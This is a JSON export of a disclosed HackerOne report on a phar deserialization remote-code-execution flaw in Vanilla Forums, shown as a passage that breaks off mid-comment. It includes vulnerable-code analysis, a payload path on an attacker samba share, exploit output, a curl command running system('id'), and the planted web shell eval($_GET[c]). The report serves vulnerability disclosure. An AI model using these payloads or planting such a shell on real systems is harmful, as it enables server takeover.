{"id":410237,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTAyMzc=","url":"https://hackerone.com/reports/410237","title":"Vanilla Forums ImportController index file_exists Unserialize Remote Code Execution Vulnerability","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2018-09-16T05:21:06.306Z","submitted_at":"2018-09-16T05:21:06.306Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mr_me","url":"/mr_me","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":17443,"url":"https://hackerone.com/vanilla","handle":"vanilla","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Vanilla","twitter_handle":"vanilla","website":"http://vanillaforums.com","about":"Vanilla is a powerfully simple discussion forum you can easily customize to make as unique as your community."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-11-23T15:45:43.118Z","bug_reporter_agreed_on_going_public_at":"2018-10-24T15:45:40.565Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\n\nAn authenticated admin user can inject an serialized payload into a phar archive and trigger read access to it via an unprotected file_exists(). An attacker\ncan leverage this to deserialize untrusted data and gain remote code execution.\n\n## Notes:\n\n- You need to have an admin account to run this poc.\n- The default path to the constants.php file is '/var/www/html/conf/constants.php', please change it in your poc files, if you need. I have installed my version of Vanilla Forums in /var/www/html\n- BEWARE!! This poc will damage the application and overwrite constants.php. Make sure you back up your installation before running it!\n- In my poc I used an upload primitive for the phar archive, but if you wanted to remotely exploit on Winodws, you could use a samba share. I have tested this and its proved to be working 100%.\n  The payload would look like phar:////attacker-share/share/poc.jpg\n- Also note, we can use whatever extension we like for the phar archive, this would help in bypassing file upload checks/etc.\n\n## Analysis:\n\nInside of applications/dashboard/controllers/class.importcontroller.php we can see the following code\n\n```\nclass ImportController extends DashboardController {\n\n    ...\n\n    public function index() {\n        $this-\u003epermission('Garden.Import'); // This permission doesn't exist, so only users with Admin == '1' will succeed.\n        $timer = new Gdn_Timer();\n\n        // Determine the current step.\n        $this-\u003eForm = new Gdn_Form();\n        $imp = new ImportModel();\n        $imp-\u003eloadState();\n\n        // Search for the list of acceptable imports.\n        $importPaths = [];\n        $existingPaths = safeGlob(PATH_UPLOADS.'/export*', ['gz', 'txt']);\n        $existingPaths2 = safeGlob(PATH_UPLOADS.'/porter/export*', ['gz']);\n        $existingPaths = array_merge($existingPaths, $existingPaths2);\n        foreach ($existingPaths as $path) {\n            $importPaths[$path] = basename($path);\n        }\n        // Add the database as a path.\n        $importPaths = array_merge(['db:' =\u003e t('This Database')], $importPaths);\n\n        if ($imp-\u003eCurrentStep \u003c 1) {\n            // Check to see if there is a file.\n            $importPath = c('Garden.Import.ImportPath');\n            $validation = new Gdn_Validation();\n\n\n            if (Gdn::request()-\u003eisAuthenticatedPostBack(true)) {\n                $upload = new Gdn_Upload();\n                $validation = new Gdn_Validation();\n                if (count($importPaths) \u003e 0) {\n                    $validation-\u003eapplyRule('PathSelect', 'Required', t('You must select a file to import.'));\n                }\n\n                if (count($importPaths) == 0 || $this-\u003eForm-\u003egetFormValue('PathSelect') == 'NEW') {                 // 1\n                    $tmpFile = $upload-\u003evalidateUpload('ImportFile', false);\n                } else {\n                    $tmpFile = '';\n                }\n\n                if ($tmpFile) {\n                    $filename = $_FILES['ImportFile']['name'];\n                    $extension = pathinfo($filename, PATHINFO_EXTENSION);\n                    $targetFolder = PATH_ROOT.DS.'uploads'.DS.'import';\n                    if (!file_exists($targetFolder)) {\n                        mkdir($targetFolder, 0777, true);\n                    }\n                    $importPath = $upload-\u003egenerateTargetName(PATH_ROOT.DS.'uploads'.DS.'import', $extension);\n                    $upload-\u003esaveAs($tmpFile, $importPath);\n                    $imp-\u003eImportPath = $importPath;\n                    $this-\u003eForm-\u003esetFormValue('PathSelect', $importPath);\n\n                    $uploadedFiles = val('UploadedFiles', $imp-\u003eData);\n                    $uploadedFiles[$importPath] = basename($filename);\n                    $imp-\u003eData['UploadedFiles'] = $uploadedFiles;\n                } elseif (($pathSelect = $this-\u003eForm-\u003egetFormValue('PathSelect'))) {                                // 2\n                    if ($pathSelect == 'NEW') {\n                        $validation-\u003eaddValidationResult('ImportFile', 'ValidateRequired');\n                    } else {\n                        $imp-\u003eImportPath = $pathSelect;                                                             // 3\n                    }\n                } elseif (!$imp-\u003eImportPath \u0026\u0026 count($importPaths) == 0) {\n                    // There was no file uploaded this request or before.\n                    $validation-\u003eaddValidationResult('ImportFile', $upload-\u003eException);\n                }\n\n                // Validate the overwrite.\n                if (true || strcasecmp($this-\u003eForm-\u003egetFormValue('Overwrite'), 'Overwrite') == 0) {\n                    if (!stringBeginsWith($this-\u003eForm-\u003egetFormValue('PathSelect'), 'Db:', true)) {\n                        $validation-\u003eapplyRule('Email', 'Required');\n                    }\n                }\n\n                if ($validation-\u003evalidate($this-\u003eForm-\u003eformValues())) {\n                    $this-\u003eForm-\u003esetFormValue('Overwrite', 'overwrite');\n                    $imp-\u003efromPost($this-\u003eForm-\u003eformValues());\n                    $this-\u003eView = 'Info';\n                } else {\n                    $this-\u003eForm-\u003esetValidationResults($validation-\u003eresults());\n                }\n            } else {\n                $this-\u003eForm-\u003esetFormValue('PathSelect', $imp-\u003eImportPath);\n            }\n            $imp-\u003esaveState();\n        } else {\n            $this-\u003esetData('Steps', $imp-\u003esteps());\n            $this-\u003eView = 'Info';\n        }\n\n        if (!stringBeginsWith($imp-\u003eImportPath, 'db:') \u0026\u0026 !file_exists($imp-\u003eImportPath)) {                         // 4\n            $imp-\u003edeleteState();\n        }\n```\n\nAt [1], we make sure our `PathSelect` is not set as \"NEW\". Then at [2] the code sets the `$pathSelect` variable from attacker controlled input. At [3] the code sets the `$imp-\u003eImportPath` variable to the attackers fully controlled string. Finally at [4] we reach a file_exists() call with attacker controlled input, leading to deserialization inside of the phar archive.\n\n## Exploitation:\n\nIn my poc I used a file upload, but you could also use a remote samba share if you are targeting a Windows installation of Vanilla Forums.The payload would look like phar:////attacker-share/share/poc.phar/.jpg\n\n## Example:\n\nThe following steps are used to re-create the vulnerability:\n\n1. We create our phar file:\n\n`saturn:~ mr_me$ php poc-stage-1.php`\n\n2. We run the poc-stage-2.py which will trigger the bug\n\n```\nsaturn:~ mr_me$ ./poc-stage-2.py.py 172.16.175.143 admin:admin123\n(+) targeting: http://172.16.175.143\n(+) logged in!\n(+) uploaded phar!\n(+) leaked phar name!\n(+) triggered a write!\n(+) shell at: http://172.16.175.143/?c=phpinfo();\n\nsaturn:~ mr_me$ curl -sSG \"http://172.16.175.143/?c=system('id');\"\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\nNow, on the victim box:\n\n```\nsteven@pluto:/var/www/html/conf$ cat constants.php \n\u003c?php if (!defined('APPLICATION')) exit();\n$a=eval($_GET[c]);//[''] = '';\n\n// Last edited by admin (172.16.175.1)2018-09-16 00:59:01steven@pluto:/var/www/html/conf$\n```\n\n## References:\n\n- https://rdot.org/forum/showthread.php?t=4379\n\n## Impact\n\nAn authenticated attacker can gain remote code execution. The supplied poc will inject PHP code into the constants.php file. Please be aware that this will damage your system, please take the correct steps to avoid frustration.","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003eAn authenticated admin user can inject an serialized payload into a phar archive and trigger read access to it via an unprotected file_exists(). An attacker\u003cbr\u003e\ncan leverage this to deserialize untrusted data and gain remote code execution.\u003c/p\u003e\n\n\u003ch2 id=\"notes\"\u003eNotes:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eYou need to have an admin account to run this poc.\u003c/li\u003e\n\u003cli\u003eThe default path to the constants.php file is \u0026#39;/var/www/html/conf/constants.php\u0026#39;, please change it in your poc files, if you need. I have installed my version of Vanilla Forums in /var/www/html\u003c/li\u003e\n\u003cli\u003eBEWARE!! This poc will damage the application and overwrite constants.php. Make sure you back up your installation before running it!\u003c/li\u003e\n\u003cli\u003eIn my poc I used an upload primitive for the phar archive, but if you wanted to remotely exploit on Winodws, you could use a samba share. I have tested this and its proved to be working 100%.\nThe payload would look like phar:////attacker-share/share/poc.jpg\u003c/li\u003e\n\u003cli\u003eAlso note, we can use whatever extension we like for the phar archive, this would help in bypassing file upload checks/etc.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"analysis\"\u003eAnalysis:\u003c/h2\u003e\n\n\u003cp\u003eInside of applications/dashboard/controllers/class.importcontroller.php we can see the following code\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eclass ImportController extends DashboardController {\n\n    ...\n\n    public function index() {\n        $this-\u0026gt;permission(\u0026#39;Garden.Import\u0026#39;); // This permission doesn\u0026#39;t exist, so only users with Admin == \u0026#39;1\u0026#39; will succeed.\n        $timer = new Gdn_Timer();\n\n        // Determine the current step.\n        $this-\u0026gt;Form = new Gdn_Form();\n        $imp = new ImportModel();\n        $imp-\u0026gt;loadState();\n\n        // Search for the list of acceptable imports.\n        $importPaths = [];\n        $existingPaths = safeGlob(PATH_UPLOADS.\u0026#39;/export*\u0026#39;, [\u0026#39;gz\u0026#39;, \u0026#39;txt\u0026#39;]);\n        $existingPaths2 = safeGlob(PATH_UPLOADS.\u0026#39;/porter/export*\u0026#39;, [\u0026#39;gz\u0026#39;]);\n        $existingPaths = array_merge($existingPaths, $existingPaths2);\n        foreach ($existingPaths as $path) {\n            $importPaths[$path] = basename($path);\n        }\n        // Add the database as a path.\n        $importPaths = array_merge([\u0026#39;db:\u0026#39; =\u0026gt; t(\u0026#39;This Database\u0026#39;)], $importPaths);\n\n        if ($imp-\u0026gt;CurrentStep \u0026lt; 1) {\n            // Check to see if there is a file.\n            $importPath = c(\u0026#39;Garden.Import.ImportPath\u0026#39;);\n            $validation = new Gdn_Validation();\n\n\n            if (Gdn::request()-\u0026gt;isAuthenticatedPostBack(true)) {\n                $upload = new Gdn_Upload();\n                $validation = new Gdn_Validation();\n                if (count($importPaths) \u0026gt; 0) {\n                    $validation-\u0026gt;applyRule(\u0026#39;PathSelect\u0026#39;, \u0026#39;Required\u0026#39;, t(\u0026#39;You must select a file to import.\u0026#39;));\n                }\n\n                if (count($importPaths) == 0 || $this-\u0026gt;Form-\u0026gt;getFormValue(\u0026#39;PathSelect\u0026#39;) == \u0026#39;NEW\u0026#39;) {                 // 1\n                    $tmpFile = $upload-\u0026gt;validateUpload(\u0026#39;ImportFile\u0026#39;, false);\n                } else {\n                    $tmpFile = \u0026#39;\u0026#39;;\n                }\n\n                if ($tmpFile) {\n                    $filename = $_FILES[\u0026#39;ImportFile\u0026#39;][\u0026#39;name\u0026#39;];\n                    $extension = pathinfo($filename, PATHINFO_EXTENSION);\n                    $targetFolder = PATH_ROOT.DS.\u0026#39;uploads\u0026#39;.DS.\u0026#39;import\u0026#39;;\n                    if (!file_exists($targetFolder)) {\n                        mkdir($targetFolder, 0777, true);\n                    }\n                    $importPath = $upload-\u0026gt;generateTargetName(PATH_ROOT.DS.\u0026#39;uploads\u0026#39;.DS.\u0026#39;import\u0026#39;, $extension);\n                    $upload-\u0026gt;saveAs($tmpFile, $importPath);\n                    $imp-\u0026gt;ImportPath = $importPath;\n                    $this-\u0026gt;Form-\u0026gt;setFormValue(\u0026#39;PathSelect\u0026#39;, $importPath);\n\n                    $uploadedFiles = val(\u0026#39;UploadedFiles\u0026#39;, $imp-\u0026gt;Data);\n                    $uploadedFiles[$importPath] = basename($filename);\n                    $imp-\u0026gt;Data[\u0026#39;UploadedFiles\u0026#39;] = $uploadedFiles;\n                } elseif (($pathSelect = $this-\u0026gt;Form-\u0026gt;getFormValue(\u0026#39;PathSelect\u0026#39;))) {                                // 2\n                    if ($pathSelect == \u0026#39;NEW\u0026#39;) {\n                        $validation-\u0026gt;addValidationResult(\u0026#39;ImportFile\u0026#39;, \u0026#39;ValidateRequired\u0026#39;);\n                    } else {\n                        $imp-\u0026gt;ImportPath = $pathSelect;                                                             // 3\n                    }\n                } elseif (!$imp-\u0026gt;ImportPath \u0026amp;\u0026amp; count($importPaths) == 0) {\n                    // There was no file uploaded this request or before.\n                    $validation-\u0026gt;addValidationResult(\u0026#39;ImportFile\u0026#39;, $upload-\u0026gt;Exception);\n                }\n\n                // Validate the overwrite.\n                if (true || strcasecmp($this-\u0026gt;Form-\u0026gt;getFormValue(\u0026#39;Overwrite\u0026#39;), \u0026#39;Overwrite\u0026#39;) == 0) {\n                    if (!stringBeginsWith($this-\u0026gt;Form-\u0026gt;getFormValue(\u0026#39;PathSelect\u0026#39;), \u0026#39;Db:\u0026#39;, true)) {\n                        $validation-\u0026gt;applyRule(\u0026#39;Email\u0026#39;, \u0026#39;Required\u0026#39;);\n                    }\n                }\n\n                if ($validation-\u0026gt;validate($this-\u0026gt;Form-\u0026gt;formValues())) {\n                    $this-\u0026gt;Form-\u0026gt;setFormValue(\u0026#39;Overwrite\u0026#39;, \u0026#39;overwrite\u0026#39;);\n                    $imp-\u0026gt;fromPost($this-\u0026gt;Form-\u0026gt;formValues());\n                    $this-\u0026gt;View = \u0026#39;Info\u0026#39;;\n                } else {\n                    $this-\u0026gt;Form-\u0026gt;setValidationResults($validation-\u0026gt;results());\n                }\n            } else {\n                $this-\u0026gt;Form-\u0026gt;setFormValue(\u0026#39;PathSelect\u0026#39;, $imp-\u0026gt;ImportPath);\n            }\n            $imp-\u0026gt;saveState();\n        } else {\n            $this-\u0026gt;setData(\u0026#39;Steps\u0026#39;, $imp-\u0026gt;steps());\n            $this-\u0026gt;View = \u0026#39;Info\u0026#39;;\n        }\n\n        if (!stringBeginsWith($imp-\u0026gt;ImportPath, \u0026#39;db:\u0026#39;) \u0026amp;\u0026amp; !file_exists($imp-\u0026gt;ImportPath)) {                         // 4\n            $imp-\u0026gt;deleteState();\n        }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAt [1], we make sure our \u003ccode\u003ePathSelect\u003c/code\u003e is not set as \u0026quot;NEW\u0026quot;. Then at [2] the code sets the \u003ccode\u003e$pathSelect\u003c/code\u003e variable from attacker controlled input. At [3] the code sets the \u003ccode\u003e$imp-\u0026gt;ImportPath\u003c/code\u003e variable to the attackers fully controlled string. Finally at [4] we reach a file_exists() call with attacker controlled input, leading to deserialization inside of the phar archive.\u003c/p\u003e\n\n\u003ch2 id=\"exploitation\"\u003eExploitation:\u003c/h2\u003e\n\n\u003cp\u003eIn my poc I used a file upload, but you could also use a remote samba share if you are targeting a Windows installation of Vanilla Forums.The payload would look like phar:////attacker-share/share/poc.phar/.jpg\u003c/p\u003e\n\n\u003ch2 id=\"example\"\u003eExample:\u003c/h2\u003e\n\n\u003cp\u003eThe following steps are used to re-create the vulnerability:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eWe create our phar file:\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e\u003ccode\u003esaturn:~ mr_me$ php poc-stage-1.php\u003c/code\u003e\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eWe run the poc-stage-2.py which will trigger the bug\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003esaturn:~ mr_me$ ./poc-stage-2.py.py 172.16.175.143 admin:admin123\n(+) targeting: http://172.16.175.143\n(+) logged in!\n(+) uploaded phar!\n(+) leaked phar name!\n(+) triggered a write!\n(+) shell at: http://172.16.175.143/?c=phpinfo();\n\nsaturn:~ mr_me$ curl -sSG \u0026quot;http://172.16.175.143/?c=system(\u0026#39;id\u0026#39;);\u0026quot;\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow, on the victim box:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003esteven\u003c/span\u003e\u003cspan class=\"o\"\u003e@\u003c/span\u003e\u003cspan class=\"nx\"\u003epluto\u003c/span\u003e\u003cspan class=\"o\"\u003e:/\u003c/span\u003e\u003cspan class=\"k\"\u003evar\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003ewww\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003ehtml\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003econf\u003c/span\u003e\u003cspan class=\"err\"\u003e$\u003c/span\u003e \u003cspan class=\"nx\"\u003ecat\u003c/span\u003e \u003cspan class=\"nx\"\u003econstants\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e \n\u003cspan class=\"o\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nb\"\u003edefined\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;APPLICATION\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"k\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$a\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003eeval\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\u003cspan class=\"c1\"\u003e//[\u0026#39;\u0026#39;] = \u0026#39;\u0026#39;;\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e// Last edited by admin (172.16.175.1)2018-09-16 00:59:01steven@pluto:/var/www/html/conf$\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"references\"\u003eReferences:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca title=\"https://rdot.org/forum/showthread.php?t=4379\" href=\"/redirect?url=https%3A%2F%2Frdot.org%2Fforum%2Fshowthread.php%3Ft%3D4379\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://rdot.org/forum/showthread.php?t=4379\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn authenticated attacker can gain remote code execution. The supplied poc will inject PHP code into the constants.php file. Please be aware that this will damage your system, please take the correct steps to avoid frustration.\u003c/p\u003e\n","bounty_amount":"600.0","formatted_bounty":"$600","weakness":{"id":52,"name":"Deserialization of Untrusted Data"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":346904,"file_name":"vanilla_forums_importcontroller_index_file_exists_unserialize_rce.zip","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/346/904/19506996dc979d5c1a5ca5bc3a7ba3a960eb2835/vanilla_forums_importcontroller_index_file_exists_unserialize_rce.zip?response-content-disposition=attachment%3B%20filename%3D%22vanilla_forums_importcontroller_index_file_exists_unserialize_rce.zip%22%3B%20filename%2A%3DUTF-8%27%27vanilla_forums_importcontroller_index_file_exists_unserialize_rce.zip\u0026response-content-type=application%2Fzip\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055307Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026X-Amz-Signature=dc01b80e217df436ff6b6d560609f5f71b99defcf5718e5ddccbbd9d86e61aa5","file_size":164771,"type":"application/zip"}],"allow_singular_disclosure_at":"2018-11-23T15:45:40.636Z","allow_singular_disclosure_after":-66233247.18439822,"singular_disclosure_allowed":true,"vote_count":38,"voters":["irek","secator","inhibitor181","spam404","sameerphad72","ahiezer","theappsec","mygf","bughacher","harry_mg","and 28 more..."],"severity":{"rating":"critical","score":9.1,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"high","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":2101,"asset_type":"URL","asset_identifier":"*.vanillaforums.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3348706,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi there. Your report has been assigned to a developer who  will provide a feedback shortly.\nThank you.","markdown_message":"\u003cp\u003eHi there. Your report has been assigned to a developer who  will provide a feedback shortly.\u003cbr\u003e\nThank you.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-17T12:49:00.539Z","updated_at":"2018-09-17T12:49:00.539Z","actor":{"username":"dexterr","cleared":false,"url":"/dexterr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/201/201/11a7da9d5256f50a86acdf6a8f3366252baee73e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3349532,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"This has been triaged.\nThank you.","markdown_message":"\u003cp\u003eThis has been triaged.\u003cbr\u003e\nThank you.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-17T15:49:57.437Z","updated_at":"2018-09-17T15:49:57.437Z","actor":{"username":"manwithnoname","cleared":false,"url":"/manwithnoname","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3349551,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-17T15:53:40.047Z","updated_at":"2018-09-17T15:53:40.047Z","additional_data":{"old_severity":"High (8.8)","new_severity":"Critical (9.1)","old_severity_id":210571,"new_severity_id":211126},"actor":{"username":"tburry","cleared":false,"url":"/tburry","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/190/499/3a293de3bd6e5bafafc57dd7c4bb58ad21f47975_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3358154,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-19T12:45:20.256Z","updated_at":"2018-09-19T12:45:20.256Z","actor":{"url":"/vanilla","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Vanilla"}},"bounty_amount":"600.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"vanilla","collaborator":{"username":"mr_me","url":"/mr_me"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3358404,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks!","markdown_message":"\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-19T13:44:41.497Z","updated_at":"2018-09-19T13:44:41.497Z","actor":{"username":"mr_me","cleared":false,"url":"/mr_me","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3376862,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Shipped in 2.6.2, 2.5.5, upcoming 2.7, and previously to cloud.","markdown_message":"\u003cp\u003eShipped in 2.6.2, 2.5.5, upcoming 2.7, and previously to cloud.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-23T23:40:55.865Z","updated_at":"2018-09-23T23:40:55.865Z","actor":{"username":"linc","cleared":false,"url":"/linc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/136/045/6328894ce30b4f6b0e176d2a721ce5ea9849d135_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"mr_me","url":"/mr_me"},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3527245,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can we please disclose this case?","markdown_message":"\u003cp\u003eCan we please disclose this 